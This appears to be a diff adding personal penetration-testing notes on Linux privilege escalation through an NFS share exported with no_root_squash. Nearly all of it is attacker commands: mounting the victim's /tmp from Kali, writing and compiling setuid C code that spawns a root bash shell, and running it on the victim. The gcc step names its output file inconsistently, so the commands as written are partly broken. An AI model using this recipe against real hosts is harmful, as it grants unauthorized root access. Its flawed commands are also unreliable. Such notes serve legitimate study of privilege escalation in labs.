@@ -1,0 +1,20 @@
+Escalation via NFS Root Squashing:
+cat /etc/exports:
+    check for:
+        /tmp *(no_root_squash) <-- That means the tmp folder is shareable and can be mounted
+
+Exploit:
+    OUr Kali:
+        showmount -e <Victim Linux IP>
+        mkdir /tmp/mountme
+        mount -o rw,vers=2 <Victim Linux IP>:/tmp /tmp/mountme
+
+        Create milicious 'C' code:
+            echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/mountme/mount.c
+            gcc /tmp/mountme/mount.c -o /tmp/mountme/mount.c
+            chmod +s /tmp/mountme/mount 
+    
+    Victim Linux:
+        cd /tmp
+        ./mount 
+        We should getting root access
